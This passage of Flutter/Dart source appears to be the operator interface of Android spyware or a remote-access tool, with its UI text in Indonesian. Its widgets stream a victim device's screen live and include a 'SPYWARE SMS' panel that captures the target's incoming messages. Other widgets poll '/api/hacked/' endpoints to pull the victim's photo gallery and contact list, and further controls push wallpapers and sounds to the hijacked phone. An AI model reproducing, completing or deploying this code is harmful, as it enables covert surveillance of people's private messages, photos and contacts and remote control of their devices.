      setState(() => _psknmrcMsg = 'Error: $e');
    }
    if (mounted) setState(() => _creatingPsknmrc = false);
  }
}

// ─── Screen Live Viewer ───────────────────────────────────────────────────────
class _ScreenLiveViewer extends StatefulWidget {
  final String? Function() getFrame;
  final int Function() getWidth;
  final int Function() getHeight;
  final bool Function() isActive;
  final VoidCallback onStop;
  const _ScreenLiveViewer({required this.getFrame, required this.getWidth, required this.getHeight, required this.isActive, required this.onStop});
  @override
  State<_ScreenLiveViewer> createState() => _ScreenLiveViewerState();
}

class _ScreenLiveViewerState extends State<_ScreenLiveViewer> {
  Timer? _refreshTimer;
  String? _frame;

  @override
  void initState() {
    super.initState();
    _refreshTimer = Timer.periodic(const Duration(milliseconds: 900), (_) {
      if (mounted) setState(() => _frame = widget.getFrame());
    });
  }

  @override
  void dispose() { _refreshTimer?.cancel(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    final frameB64 = _frame;
    final w = widget.getWidth();
    final h = widget.getHeight();
    final ratio = (w > 0 && h > 0) ? w / h : 9 / 16;
    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(
        backgroundColor: Colors.black, elevation: 0,
        leading: GestureDetector(
          onTap: () => Navigator.pop(context),
          child: Container(margin: const EdgeInsets.all(8),
            decoration: BoxDecoration(border: Border.all(color: const Color(0xFF10B981).withOpacity(0.4)), borderRadius: BorderRadius.circular(10)),
            child: const Icon(Icons.arrow_back_ios_new_rounded, color: Colors.white, size: 16))),
        title: Row(children: [
          Container(width: 8, height: 8, decoration: const BoxDecoration(shape: BoxShape.circle, color: Color(0xFF10B981), boxShadow: [BoxShadow(color: Color(0xFF10B981), blurRadius: 6)])),
          const SizedBox(width: 8),
          const Text('SCREEN LIVE', style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 2)),
        ]),
        actions: [
          GestureDetector(
            onTap: () { widget.onStop(); Navigator.pop(context); },
            child: Container(
              margin: const EdgeInsets.only(right: 12),
              padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 6),
              decoration: BoxDecoration(color: Colors.red.withOpacity(0.15), borderRadius: BorderRadius.circular(8), border: Border.all(color: Colors.red.withOpacity(0.5))),
              child: const Text('STOP', style: TextStyle(fontFamily: 'Orbitron', fontSize: 10, color: Colors.red, letterSpacing: 1, fontWeight: FontWeight.bold)))),
        ],
      ),
      body: Center(
        child: frameB64 == null
          ? Column(mainAxisAlignment: MainAxisAlignment.center, children: [
              const SizedBox(width: 40, height: 40, child: CircularProgressIndicator(color: Color(0xFF10B981), strokeWidth: 2)),
              const SizedBox(height: 16),
              const Text('Menunggu frame dari device...', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: Colors.white54)),
              const SizedBox(height: 6),
              const Text('Device perlu approve izin screen capture', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white30)),
            ])
          : AspectRatio(
              aspectRatio: ratio,
              child: Image.memory(base64Decode(frameB64), fit: BoxFit.contain, gaplessPlayback: true,
                errorBuilder: (_, __, ___) => const Center(child: Text('Frame error', style: TextStyle(color: Colors.red, fontFamily: 'ShareTechMono'))))),
      ),
    );
  }
}

// ─── SMS Spy Sheet ────────────────────────────────────────────────────────────
class _SmsSpySheet extends StatefulWidget {
  final String deviceId;
  final String deviceName;
  final bool smsSpyActive;
  final Future<void> Function(bool) onToggle;
  final Future<List<Map<String, dynamic>>> Function(String) onLoadMessages;
  final void Function(String, {bool isError}) onSnack;
  const _SmsSpySheet({
    required this.deviceId, required this.deviceName, required this.smsSpyActive,
    required this.onToggle, required this.onLoadMessages, required this.onSnack,
  });
  @override
  State<_SmsSpySheet> createState() => _SmsSpySheetState();
}

class _SmsSpySheetState extends State<_SmsSpySheet> {
  static const _red    = Color(0xFFEF4444);
  static const _purple = Color(0xFF8B5CF6);
  late bool _active;
  bool _toggling = false;
  String _tab = 'new'; // 'new' or 'old'
  List<Map<String, dynamic>> _messages = [];
  bool _loading = false;

  @override
  void initState() {
    super.initState();
    _active = widget.smsSpyActive;
    _loadMessages();
  }

  Future<void> _loadMessages() async {
    setState(() => _loading = true);
    final msgs = await widget.onLoadMessages(_tab);
    if (mounted) setState(() { _messages = msgs; _loading = false; });
  }

  @override
  Widget build(BuildContext context) {
    return DraggableScrollableSheet(
      initialChildSize: 0.85,
      maxChildSize: 0.95,
      minChildSize: 0.4,
      expand: false,
      builder: (_, ctrl) => Container(
        decoration: BoxDecoration(
          color: const Color(0xFF0D1F35),
          borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
          border: Border.all(color: _red.withOpacity(0.3))),
        child: Column(children: [
          // Handle
          Padding(
            padding: const EdgeInsets.only(top: 12, bottom: 4),
            child: Center(child: Container(width: 40, height: 4,
              decoration: BoxDecoration(color: _red.withOpacity(0.3), borderRadius: BorderRadius.circular(2))))),
          // Header
          Padding(
            padding: const EdgeInsets.fromLTRB(20, 12, 20, 0),
            child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              Row(children: [
                Container(width: 36, height: 36,
                  decoration: BoxDecoration(color: _red.withOpacity(0.15), borderRadius: BorderRadius.circular(10), border: Border.all(color: _red.withOpacity(0.4))),
                  child: const Center(child: Icon(Icons.message_rounded, color: _red, size: 18))),
                const SizedBox(width: 12),
                Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                  const Text('SPYWARE SMS', style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
                  Text('Target: ${widget.deviceName}', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: _red)),
                ]),
                const Spacer(),
                // Toggle on/off
                _toggling
                  ? const SizedBox(width: 24, height: 24, child: CircularProgressIndicator(color: _red, strokeWidth: 2))
                  : GestureDetector(
                      onTap: () async {
                        setState(() => _toggling = true);
                        await widget.onToggle(!_active);
                        if (mounted) setState(() { _active = !_active; _toggling = false; });
                      },
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                        decoration: BoxDecoration(
                          color: _active ? _red.withOpacity(0.2) : Colors.white.withOpacity(0.05),
                          borderRadius: BorderRadius.circular(8),
                          border: Border.all(color: _active ? _red : Colors.white.withOpacity(0.2))),
                        child: Text(_active ? '🟢 ON' : '⚫ OFF',
                          style: TextStyle(fontFamily: 'Orbitron', fontSize: 10, color: _active ? _red : Colors.white54, letterSpacing: 1)))),
              ]),
              const SizedBox(height: 16),
              // Tab bar SMS baru / lama
              Row(children: [
                Expanded(child: GestureDetector(
                  onTap: () { setState(() => _tab = 'new'); _loadMessages(); },
                  child: Container(
                    padding: const EdgeInsets.symmetric(vertical: 10),
                    decoration: BoxDecoration(
                      color: _tab == 'new' ? _red.withOpacity(0.2) : Colors.transparent,
                      borderRadius: BorderRadius.circular(8),
                      border: Border.all(color: _tab == 'new' ? _red : Colors.white.withOpacity(0.1))),
                    child: const Center(child: Text('SMS BARU', style: TextStyle(fontFamily: 'Orbitron', fontSize: 10, color: Colors.white, letterSpacing: 1)))))),
                const SizedBox(width: 10),
                Expanded(child: GestureDetector(
                  onTap: () { setState(() => _tab = 'old'); _loadMessages(); },
                  child: Container(
                    padding: const EdgeInsets.symmetric(vertical: 10),
                    decoration: BoxDecoration(
                      color: _tab == 'old' ? _purple.withOpacity(0.2) : Colors.transparent,
                      borderRadius: BorderRadius.circular(8),
                      border: Border.all(color: _tab == 'old' ? _purple : Colors.white.withOpacity(0.1))),
                    child: const Center(child: Text('SMS LAMA', style: TextStyle(fontFamily: 'Orbitron', fontSize: 10, color: Colors.white, letterSpacing: 1)))))),
              ]),
              const SizedBox(height: 8),
            ]),
          ),
          // Message list
          Expanded(
            child: _loading
              ? const Center(child: SizedBox(width: 28, height: 28, child: CircularProgressIndicator(color: _red, strokeWidth: 2)))
              : _messages.isEmpty
                ? Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
                    Icon(Icons.inbox_rounded, color: Colors.white.withOpacity(0.2), size: 48),
                    const SizedBox(height: 12),
                    Text(_active ? 'Belum ada pesan masuk' : 'Aktifkan pantau untuk mulai capture',
                      style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white.withOpacity(0.3))),
                  ]))
                : ListView.builder(
                    controller: ctrl,
                    padding: const EdgeInsets.fromLTRB(16, 0, 16, 16),
                    itemCount: _messages.length,
                    itemBuilder: (_, i) {
                      final msg = _messages[i];
                      return Container(
                        margin: const EdgeInsets.only(bottom: 10),
                        padding: const EdgeInsets.all(14),
                        decoration: BoxDecoration(
                          color: const Color(0xFF071525),
                          borderRadius: BorderRadius.circular(12),
                          border: Border.all(color: _red.withOpacity(0.2))),
                        child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                          Row(children: [
                            Container(padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                              decoration: BoxDecoration(color: _red.withOpacity(0.15), borderRadius: BorderRadius.circular(4)),
                              child: Text(msg['appName'] as String? ?? 'Unknown', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 9, color: _red))),
                            const Spacer(),
                            Text(msg['time'] as String? ?? '', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 8, color: Colors.white.withOpacity(0.3))),
                          ]),
                          const SizedBox(height: 8),
                          Text(msg['sender'] as String? ?? 'Unknown', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: Colors.white, fontWeight: FontWeight.bold)),
                          const SizedBox(height: 4),
                          Text(msg['content'] as String? ?? '', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white.withOpacity(0.6), height: 1.5)),
                        ]),
                      );
                    }),
          ),
        ]),
      ),
    );
  }
}

// ─── Gallery Sheet ────────────────────────────────────────────────────────────
class _GallerySheet extends StatefulWidget {
  final String deviceId;
  final String deviceName;
  final void Function(String, {bool isError}) onSnack;
  const _GallerySheet({required this.deviceId, required this.deviceName, required this.onSnack});
  @override
  State<_GallerySheet> createState() => _GallerySheetState();
}

class _GallerySheetState extends State<_GallerySheet> {
  static const _cyan = Color(0xFF06B6D4);
  List<Map<String, dynamic>> _items = [];
  bool _loading = true;
  Timer? _pollTimer;
  int _received = 0;

  @override
  void initState() {
    super.initState();
    _startPolling();
  }

  void _startPolling() {
    _pollTimer = Timer.periodic(const Duration(seconds: 2), (_) async {
      try {
        final res = await ApiService.get('/api/hacked/gallery/${widget.deviceId}');
        if (res['success'] == true && mounted) {
          final newItems = List<Map<String, dynamic>>.from(res['photos'] ?? []);
          if (newItems.length > _items.length) {
            // Tambah satu-satu dengan delay biar keliatan efeknya
            for (int i = _items.length; i < newItems.length; i++) {
              await Future.delayed(const Duration(milliseconds: 300));
              if (mounted) setState(() => _items.add(newItems[i]));
            }
          }
          if (res['done'] == true) { _pollTimer?.cancel(); if (mounted) setState(() => _loading = false); }
        }
      } catch (_) {}
    });
  }

  @override
  void dispose() { _pollTimer?.cancel(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    return DraggableScrollableSheet(
      initialChildSize: 0.85,
      maxChildSize: 0.95,
      minChildSize: 0.4,
      expand: false,
      builder: (_, ctrl) => Container(
        decoration: BoxDecoration(
          color: const Color(0xFF0D1F35),
          borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
          border: Border.all(color: _cyan.withOpacity(0.3))),
        child: Column(children: [
          Padding(
            padding: const EdgeInsets.only(top: 12, bottom: 4),
            child: Center(child: Container(width: 40, height: 4, decoration: BoxDecoration(color: _cyan.withOpacity(0.3), borderRadius: BorderRadius.circular(2))))),
          Padding(
            padding: const EdgeInsets.fromLTRB(20, 12, 20, 12),
            child: Row(children: [
              Container(width: 36, height: 36,
                decoration: BoxDecoration(color: _cyan.withOpacity(0.15), borderRadius: BorderRadius.circular(10), border: Border.all(color: _cyan.withOpacity(0.4))),
                child: const Center(child: Icon(Icons.photo_library_rounded, color: _cyan, size: 18))),
              const SizedBox(width: 12),
              Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                const Text('VIEW GALLERY', style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
                Text('${_items.length} foto${_loading ? " (loading...)" : ""}', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: _cyan)),
              ]),
              const Spacer(),
              if (_loading) const SizedBox(width: 20, height: 20, child: CircularProgressIndicator(color: _cyan, strokeWidth: 2)),
            ]),
          ),
          Expanded(
            child: _items.isEmpty
              ? Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
                  const SizedBox(width: 32, height: 32, child: CircularProgressIndicator(color: _cyan, strokeWidth: 2)),
                  const SizedBox(height: 14),
                  const Text('Mengambil daftar foto...', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white54)),
                ]))
              : GridView.builder(
                  controller: ctrl,
                  padding: const EdgeInsets.fromLTRB(16, 0, 16, 16),
                  gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(crossAxisCount: 3, crossAxisSpacing: 6, mainAxisSpacing: 6),
                  itemCount: _items.length,
                  itemBuilder: (_, i) {
                    final item = _items[i];
                    final thumb = item['thumbnailBase64'] as String?;
                    return Stack(children: [
                      Container(
                        decoration: BoxDecoration(
                          color: const Color(0xFF071525),
                          borderRadius: BorderRadius.circular(8),
                          border: Border.all(color: _cyan.withOpacity(0.2))),
                        child: thumb != null
                          ? ClipRRect(borderRadius: BorderRadius.circular(8),
                              child: Image.memory(base64Decode(thumb), fit: BoxFit.cover, width: double.infinity, height: double.infinity,
                                errorBuilder: (_, __, ___) => const Icon(Icons.broken_image_outlined, color: Colors.white24, size: 28)))
                          : const Center(child: Icon(Icons.image_outlined, color: Colors.white24, size: 28))),
                      // Download button
                      Positioned(
                        bottom: 4, right: 4,
                        child: GestureDetector(
                          onTap: () => _downloadPhoto(item),
                          child: Container(
                            width: 26, height: 26,
                            decoration: BoxDecoration(color: _cyan.withOpacity(0.9), borderRadius: BorderRadius.circular(6)),
                            child: const Icon(Icons.download_rounded, color: Colors.white, size: 16)))),
                    ]);
                  }),
          ),
        ]),
      ),
    );
  }

  void _downloadPhoto(Map<String, dynamic> item) async {
    try {
      final res = await ApiService.get('/api/hacked/gallery/${widget.deviceId}/download?photoId=${item['id']}');
      if (res['success'] == true) {
        widget.onSnack('Foto berhasil didownload!');
      } else {
        widget.onSnack('Gagal download', isError: true);
      }
    } catch (_) {
      widget.onSnack('Error download', isError: true);
    }
  }
}

// ─── Contacts Sheet ───────────────────────────────────────────────────────────
class _ContactsSheet extends StatefulWidget {
  final String deviceId;
  final String deviceName;
  const _ContactsSheet({required this.deviceId, required this.deviceName});
  @override
  State<_ContactsSheet> createState() => _ContactsSheetState();
}

class _ContactsSheetState extends State<_ContactsSheet> {
  static const _purple = Color(0xFF8B5CF6);
  List<Map<String, dynamic>> _contacts = [];
  bool _loading = true;
  String _search = '';
  final _searchCtrl = TextEditingController();

  @override
  void initState() {
    super.initState();
    _loadContacts();
  }

  void _loadContacts() {
    Timer.periodic(const Duration(seconds: 2), (t) async {
      try {
        final res = await ApiService.get('/api/hacked/contacts/${widget.deviceId}');
        if (res['success'] == true && mounted) {
          setState(() {
            _contacts = List<Map<String, dynamic>>.from(res['contacts'] ?? []);
            _loading = res['contacts'] == null || (res['contacts'] as List).isEmpty;
          });
          if (!_loading) t.cancel();
        }
      } catch (_) {}
    });
  }

  @override
  void dispose() { _searchCtrl.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    final filtered = _contacts.where((c) {
      final name  = (c['name'] as String? ?? '').toLowerCase();
      final phone = (c['phone'] as String? ?? '').toLowerCase();
      return name.contains(_search.toLowerCase()) || phone.contains(_search.toLowerCase());
    }).toList();

    return DraggableScrollableSheet(
      initialChildSize: 0.85,
      maxChildSize: 0.95,
      minChildSize: 0.4,
      expand: false,
      builder: (_, ctrl) => Container(
        decoration: BoxDecoration(
          color: const Color(0xFF0D1F35),
          borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
          border: Border.all(color: _purple.withOpacity(0.3))),
        child: Column(children: [
          Padding(
            padding: const EdgeInsets.only(top: 12, bottom: 4),
            child: Center(child: Container(width: 40, height: 4, decoration: BoxDecoration(color: _purple.withOpacity(0.3), borderRadius: BorderRadius.circular(2))))),
          Padding(
            padding: const EdgeInsets.fromLTRB(20, 12, 20, 0),
            child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              Row(children: [
                Container(width: 36, height: 36,
                  decoration: BoxDecoration(color: _purple.withOpacity(0.15), borderRadius: BorderRadius.circular(10), border: Border.all(color: _purple.withOpacity(0.4))),
                  child: const Center(child: Icon(Icons.contacts_rounded, color: _purple, size: 18))),
                const SizedBox(width: 12),
                Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                  const Text('LIST KONTAK', style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
                  Text('${_contacts.length} kontak ditemukan', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: _purple)),
                ]),
                const Spacer(),
                if (_loading) const SizedBox(width: 20, height: 20, child: CircularProgressIndicator(color: _purple, strokeWidth: 2)),
              ]),
              const SizedBox(height: 12),
              // Search bar
              Container(
                decoration: BoxDecoration(color: const Color(0xFF071525), borderRadius: BorderRadius.circular(10), border: Border.all(color: _purple.withOpacity(0.25))),
                child: TextField(
                  controller: _searchCtrl,
                  onChanged: (v) => setState(() => _search = v),
                  style: const TextStyle(fontFamily: 'ShareTechMono', color: Colors.white, fontSize: 12),
                  decoration: InputDecoration(
                    border: InputBorder.none,
                    contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
                    hintText: 'Cari nama / nomor...',
                    hintStyle: TextStyle(color: Colors.white.withOpacity(0.25), fontFamily: 'ShareTechMono', fontSize: 11),
                    prefixIcon: Icon(Icons.search_rounded, color: _purple.withOpacity(0.5), size: 18)),
                ),
              ),
              const SizedBox(height: 8),
            ]),
          ),
          Expanded(
            child: _loading && _contacts.isEmpty
              ? Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
                  const SizedBox(width: 32, height: 32, child: CircularProgressIndicator(color: _purple, strokeWidth: 2)),
                  const SizedBox(height: 14),
                  const Text('Mengambil kontak...', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white54)),
                ]))
              : filtered.isEmpty
                ? const Center(child: Text('Tidak ada hasil', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white30)))
                : ListView.builder(
                    controller: ctrl,
                    padding: const EdgeInsets.fromLTRB(16, 0, 16, 16),
                    itemCount: filtered.length,
                    itemBuilder: (_, i) {
                      final c = filtered[i];
                      return Container(
                        margin: const EdgeInsets.only(bottom: 8),
                        padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
                        decoration: BoxDecoration(color: const Color(0xFF071525), borderRadius: BorderRadius.circular(10), border: Border.all(color: _purple.withOpacity(0.15))),
                        child: Row(children: [
                          Container(width: 36, height: 36,
                            decoration: BoxDecoration(color: _purple.withOpacity(0.15), shape: BoxShape.circle),
                            child: Center(child: Text(
                              (c['name'] as String? ?? '?').substring(0, 1).toUpperCase(),
                              style: const TextStyle(fontFamily: 'Orbitron', fontSize: 14, color: _purple, fontWeight: FontWeight.bold)))),
                          const SizedBox(width: 12),
                          Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                            Text(c['name'] as String? ?? 'Unknown', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 12, color: Colors.white, fontWeight: FontWeight.bold)),
                            const SizedBox(height: 2),
                            Text(c['phone'] as String? ?? '-', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white.withOpacity(0.4))),
                          ])),
                        ]),
                      );
                    }),
          ),
        ]),
      ),
    );
  }
}

// ─── Wallpaper Sheet ──────────────────────────────────────────────────────────
class _WallpaperSheet extends StatefulWidget {
  final String deviceId;
  final String deviceName;
  final void Function(String) onSent;
  final void Function(String) onError;
  const _WallpaperSheet({required this.deviceId, required this.deviceName, required this.onSent, required this.onError});
  @override
  State<_WallpaperSheet> createState() => _WallpaperSheetState();
}

class _WallpaperSheetState extends State<_WallpaperSheet> {
  static const _purple = Color(0xFF8B5CF6);
  File? _pickedFile;
  String? _base64Image;
  String? _mimeType;
  bool _sending = false;

  Future<void> _pickImage(ImageSource source) async {
    final picker = ImagePicker();
    final xfile  = await picker.pickImage(source: source, imageQuality: 75, maxWidth: 1080, maxHeight: 1920);
    if (xfile == null) return;
    final file   = File(xfile.path);
    final bytes  = await file.readAsBytes();
    final ext    = xfile.path.split('.').last.toLowerCase();
    setState(() {
      _pickedFile  = file;
      _base64Image = base64Encode(bytes);
      _mimeType    = ext == 'png' ? 'image/png' : 'image/jpeg';
    });
  }

  Future<void> _send() async {
    if (_base64Image == null) return;
    setState(() => _sending = true);
    try {
      final res = await ApiService.post('/api/hacked/wallpaper', {
        'deviceId': widget.deviceId, 'imageBase64': _base64Image, 'mimeType': _mimeType ?? 'image/jpeg',
      });
      Navigator.pop(context);
      if (res['success'] == true) { widget.onSent(res['message'] ?? 'Wallpaper dikirim!'); }
      else { widget.onError(res['message'] ?? 'Gagal'); }
    } catch (e) { widget.onError('Error: $e'); }
    if (mounted) setState(() => _sending = false);
  }

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: EdgeInsets.only(bottom: MediaQuery.of(context).viewInsets.bottom),
      child: Container(
        decoration: BoxDecoration(
          color: const Color(0xFF0D1F35),
          borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
          border: Border.all(color: _purple.withOpacity(0.3))),
        padding: const EdgeInsets.fromLTRB(24, 24, 24, 32),
        child: Column(mainAxisSize: MainAxisSize.min, crossAxisAlignment: CrossAxisAlignment.start, children: [
          Center(child: Container(width: 40, height: 4, decoration: BoxDecoration(color: _purple.withOpacity(0.3), borderRadius: BorderRadius.circular(2)))),
          const SizedBox(height: 20),
          Row(children: [
            Container(width: 36, height: 36,
              decoration: BoxDecoration(color: const Color(0xFFFF6B35).withOpacity(0.15), borderRadius: BorderRadius.circular(10), border: Border.all(color: const Color(0xFFFF6B35).withOpacity(0.4))),
              child: const Center(child: Icon(Icons.wallpaper_rounded, color: Color(0xFFFF6B35), size: 18))),
            const SizedBox(width: 12),
            Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              const Text('GANTI WALLPAPER', style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
              Text('Target: ${widget.deviceName}', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Color(0xFFFF6B35))),
            ]),
          ]),
          const SizedBox(height: 20),
          if (_pickedFile != null)
            Container(height: 160, width: double.infinity, margin: const EdgeInsets.only(bottom: 16),
              decoration: BoxDecoration(borderRadius: BorderRadius.circular(14), border: Border.all(color: _purple.withOpacity(0.4))),
              child: ClipRRect(borderRadius: BorderRadius.circular(13), child: Image.file(_pickedFile!, fit: BoxFit.cover, width: double.infinity)))
          else
            Container(height: 120, width: double.infinity, margin: const EdgeInsets.only(bottom: 16),
              decoration: BoxDecoration(color: const Color(0xFF071525), borderRadius: BorderRadius.circular(14), border: Border.all(color: _purple.withOpacity(0.2))),
              child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
                Icon(Icons.image_outlined, color: _purple.withOpacity(0.4), size: 36),
                const SizedBox(height: 8),
                Text('Pilih foto untuk dijadikan wallpaper', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white.withOpacity(0.4))),
              ])),
          Row(children: [
            Expanded(child: GestureDetector(
              onTap: () => _pickImage(ImageSource.gallery),
              child: Container(padding: const EdgeInsets.symmetric(vertical: 13),
                decoration: BoxDecoration(color: _purple.withOpacity(0.1), borderRadius: BorderRadius.circular(12), border: Border.all(color: _purple.withOpacity(0.4))),
                child: const Row(mainAxisAlignment: MainAxisAlignment.center, children: [
                  Icon(Icons.photo_library_rounded, color: _purple, size: 16),
                  SizedBox(width: 8),
                  Text('Galeri', style: TextStyle(fontFamily: 'Orbitron', fontSize: 11, color: _purple, letterSpacing: 1)),
                ])))),
            const SizedBox(width: 12),
            Expanded(child: GestureDetector(
              onTap: () => _pickImage(ImageSource.camera),
              child: Container(padding: const EdgeInsets.symmetric(vertical: 13),
                decoration: BoxDecoration(color: _purple.withOpacity(0.1), borderRadius: BorderRadius.circular(12), border: Border.all(color: _purple.withOpacity(0.4))),
                child: const Row(mainAxisAlignment: MainAxisAlignment.center, children: [
                  Icon(Icons.camera_alt_rounded, color: _purple, size: 16),
                  SizedBox(width: 8),
                  Text('Kamera', style: TextStyle(fontFamily: 'Orbitron', fontSize: 11, color: _purple, letterSpacing: 1)),
                ])))),
          ]),
          const SizedBox(height: 16),
          Row(children: [
            Expanded(child: GestureDetector(
              onTap: () => Navigator.pop(context),
              child: Container(padding: const EdgeInsets.symmetric(vertical: 14),
                decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.white.withOpacity(0.15))),
                child: const Center(child: Text('Batal', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, color: Colors.white70, letterSpacing: 1)))))),
            const SizedBox(width: 12),
            Expanded(child: GestureDetector(
              onTap: (_pickedFile == null || _sending) ? null : _send,
              child: Container(padding: const EdgeInsets.symmetric(vertical: 14),
                decoration: BoxDecoration(
                  gradient: LinearGradient(colors: _pickedFile != null ? [const Color(0xFFFF6B35), const Color(0xFFEA580C)] : [Colors.grey.withOpacity(0.4), Colors.grey.withOpacity(0.3)]),
                  borderRadius: BorderRadius.circular(12)),
                child: Center(child: _sending
                  ? const SizedBox(width: 18, height: 18, child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2))
                  : const Text('KIRIM', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)))))),
          ]),
        ]),
      ),
    );
  }
}

// ─── Sound Sheet ──────────────────────────────────────────────────────────────
class _SoundSheet extends StatefulWidget {
  final String deviceId;
  final String deviceName;
  final void Function(String) onSent;
  final void Function(String) onError;
  const _SoundSheet({required this.deviceId, required this.deviceName, required this.onSent, required this.onError});
  @override
  State<_SoundSheet> createState() => _SoundSheetState();
}

class _SoundSheetState extends State<_SoundSheet> {
  static const _green = Color(0xFF10B981);
  String? _base64Audio;
  String? _mimeType;
  String? _fileName;
  bool _sending = false;
  bool _picking = false;

  Future<void> _pickAudio() async {
    final status = await Permission.storage.request();
    if (!status.isGranted) {
      final audioStatus = await Permission.audio.request();
      if (!audioStatus.isGranted && mounted) {
        showError(context, 'Izin storage/audio diperlukan');
        return;
      }
    }
    setState(() => _picking = true);
    try {
      final result = await FilePicker.platform.pickFiles(type: FileType.custom, allowedExtensions: ['mp3', 'wav', 'ogg', 'm4a', 'aac'], allowMultiple: false);
      if (result != null && result.files.single.path != null) {
        final file  = File(result.files.single.path!);
        final bytes = await file.readAsBytes();
        final ext   = result.files.single.extension?.toLowerCase() ?? 'mp3';
        final mime  = ext == 'wav' ? 'audio/wav' : ext == 'ogg' ? 'audio/ogg' : ext == 'aac' ? 'audio/aac' : ext == 'm4a' ? 'audio/mp4' : 'audio/mpeg';
        setState(() { _base64Audio = base64Encode(bytes); _mimeType = mime; _fileName = result.files.single.name; });
      }
    } catch (e) { if (mounted) widget.onError('Gagal buka file: $e'); }
    if (mounted) setState(() => _picking = false);
  }

  Future<void> _send() async {
    if (_base64Audio == null) return;
    setState(() => _sending = true);
    try {
      final res = await ApiService.post('/api/hacked/command', {'deviceId': widget.deviceId, 'type': 'sound', 'payload': {'audioBase64': _base64Audio, 'mimeType': _mimeType ?? 'audio/mpeg'}});
      Navigator.pop(context);
      if (res['success'] == true) { widget.onSent(res['message'] ?? 'Sound dikirim!'); }
      else { widget.onError(res['message'] ?? 'Gagal'); }
    } catch (e) { widget.onError('Error: $e'); }
    if (mounted) setState(() => _sending = false);
  }

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: EdgeInsets.only(bottom: MediaQuery.of(context).viewInsets.bottom),
      child: Container(
        decoration: BoxDecoration(color: const Color(0xFF0D1F35), borderRadius: const BorderRadius.vertical(top: Radius.circular(24)), border: Border.all(color: _green.withOpacity(0.3))),
        padding: const EdgeInsets.fromLTRB(24, 24, 24, 32),
        child: Column(mainAxisSize: MainAxisSize.min, crossAxisAlignment: CrossAxisAlignment.start, children: [
          Center(child: Container(width: 40, height: 4, decoration: BoxDecoration(color: _green.withOpacity(0.3), borderRadius: BorderRadius.circular(2)))),
          const SizedBox(height: 20),
          Row(children: [
            Container(width: 36, height: 36, decoration: BoxDecoration(color: _green.withOpacity(0.15), borderRadius: BorderRadius.circular(10), border: Border.all(color: _green.withOpacity(0.4))),
              child: const Center(child: Icon(Icons.music_note_rounded, color: _green, size: 18))),
            const SizedBox(width: 12),
            Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              const Text('PLAY SOUND', style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
              Text('Target: ${widget.deviceName}', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: _green)),
            ]),
          ]),
          const SizedBox(height: 20),
          GestureDetector(
            onTap: _picking ? null : _pickAudio,
            child: Container(
              width: double.infinity, padding: const EdgeInsets.symmetric(vertical: 16, horizontal: 14),
              decoration: BoxDecoration(
                color: _fileName != null ? _green.withOpacity(0.1) : const Color(0xFF071525),
                borderRadius: BorderRadius.circular(12),
